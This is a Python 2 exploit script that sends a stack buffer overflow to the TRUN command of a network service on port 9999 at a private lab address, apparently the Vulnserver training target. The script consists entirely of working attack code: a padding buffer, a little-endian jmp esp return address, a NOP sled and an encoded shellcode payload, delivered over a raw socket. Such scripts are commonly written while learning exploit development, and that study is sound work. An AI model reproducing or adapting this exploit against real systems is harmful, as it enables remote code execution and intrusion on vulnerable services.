#!/usr/bin/python
import os 
import sys 
import socket

host = "192.168.242.130"
port = 9999
payload = ("\xd9\xc9\xd9\x74\x24\xf4\x58\x2b\xc9\xb1\x59\xbb\x2b\x1b"
"\x91\x8a\x31\x58\x19\x03\x58\x19\x83\xc0\x04\xc9\xee\x6d"
"\x62\x82\x11\x8e\x73\xfc\x98\x6b\x42\x2e\xfe\xf8\xf7\xfe"
"\x74\xac\xfb\x75\xd8\x45\x35\x76\xd2\xd2\x7f\xae\x66\x6e"
"\xa8\x9f\xb8\x23\x94\xbe\x44\x3e\xc9\x60\x74\xf1\x1c\x61"
"\xb1\x47\x6a\x8e\x6f\x0f\x1f\x02\x80\x24\x5d\x9e\xa1\xea"
"\xe9\x9e\xd9\x8f\x2e\x6a\x56\x91\x7e\x19\x2e\x89\x2e\x96"
"\xf7\x89\xcf\x7b\x82\x03\xbb\x47\xc4\xa2\xbb\x3c\xe2\x4f"
"\x42\x94\x3a\x90\x84\xd7\x30\xbc\x06\x20\x72\x5c\x7d\x5a"
"\x80\xe1\x86\x99\xfa\x3d\x02\x3d\x5c\xb5\xb4\x99\x5c\x1a"
"\x22\x6a\x52\xd7\x20\x34\x77\xe6\xe5\x4f\x83\x63\x08\x9f"
"\x05\x37\x2f\x3b\x4d\xe3\x4e\x1a\x2b\x42\x6e\x7c\x93\x3b"
"\xca\xf7\x36\x2d\x6a\xf8\xc8\x52\x36\x6e\x04\x9f\xc9\x6e"
"\x02\xa8\xba\x5c\x8d\x02\x55\xec\x46\x8d\xa2\x65\x40\x2e"
"\x7c\xcd\x01\xd0\x7d\x2d\x0b\x17\x29\x7d\x23\xbe\x52\x16"
"\xb3\x3f\x87\x82\xb9\xd7\xe8\xfa\x4c\xa7\x81\xf8\xb0\xb9"
"\x0d\x75\x56\xe9\xfd\xd5\xc7\x4a\xae\x95\xb7\x22\xa4\x1a"
"\xe7\x53\xc7\xf1\x80\xfe\x28\xaf\xf9\x96\xd1\xea\x72\x06"
"\x1d\x21\xff\x08\x95\xc3\xff\xc7\x5e\xa6\x13\x3f\x39\x48"
"\xec\xc0\xac\x48\x86\xc4\x66\x1f\x3e\xc7\x5f\x57\xe1\x38"
"\x8a\xe4\xe6\xc7\x4b\xdc\x9d\xfe\xd9\x60\xca\xfe\x0d\x60"
"\x0a\xa9\x47\x60\x62\x0d\x3c\x33\x97\x52\xe9\x20\x04\xc7"
"\x12\x10\xf8\x40\x7b\x9e\x27\xa6\x24\x61\x02\xb4\x23\x9d"
"\xd0\x93\x8b\xf5\x2a\xa4\x2b\x05\x41\x24\x7c\x6d\x9e\x0b"
"\x73\x5d\x5f\x86\xdc\xf5\xea\x47\xae\x64\xea\x4d\x6e\x38"
"\xeb\x62\xab\xcb\x96\x0b\x4c\x2c\x67\x02\x29\x2d\x67\x2a"
"\x4f\x12\xb1\x13\x25\x55\x01\x20\x36\xe0\x24\x01\xdd\x0a"
"\x7a\x51\xf4")
buffer = "A" * 2003 + "\xAF\x11\x50\x62" + "\x90" * 10 + payload  #0x625011AF jmp esp , written in little endian
s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
print ("sending final EXPLOIT")
s.send("TRUN /.:/" + buffer)
print s.recv(1024)
s.close()
